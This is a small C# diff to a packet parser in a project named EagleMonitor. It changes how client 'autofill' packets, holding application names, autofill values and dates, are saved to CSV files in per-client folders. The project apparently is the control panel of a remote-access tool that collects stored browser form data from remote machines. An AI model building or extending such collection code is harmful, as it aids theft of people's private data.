@@ -40,12 +40,10 @@ namespace EagleMonitor.PacketParser
                             Miscellaneous.ToCSV(clientHandler.autofillForm.dataGridView1, clientHandler.clientPath + "\\Autofill\\" + Utils.Miscellaneous.DateFormater() + ".csv");
                             clientHandler.autofillForm.loadingCircle1.Visible = false;
                             clientHandler.autofillForm.loadingCircle1.Active = false;
-                            autofillPacket = null;
                         }));
                     }
                     else
                     { Miscellaneous.ToCSV(autofillPacket.autofillList, clientHandler.clientPath + "\\Autofill\\" + Utils.Miscellaneous.DateFormater() + ".csv", new string[] { "Application", "Name", "Autofill", "Date created", "Last date used" }); }
-                    return;
                 }
                 catch { Miscellaneous.ToCSV(autofillPacket.autofillList, clientHandler.clientPath + "\\Autofill\\" + Utils.Miscellaneous.DateFormater() + ".csv", new string[] { "Application", "Name", "Autofill", "Date created", "Last date used" }); }
             }).Start();
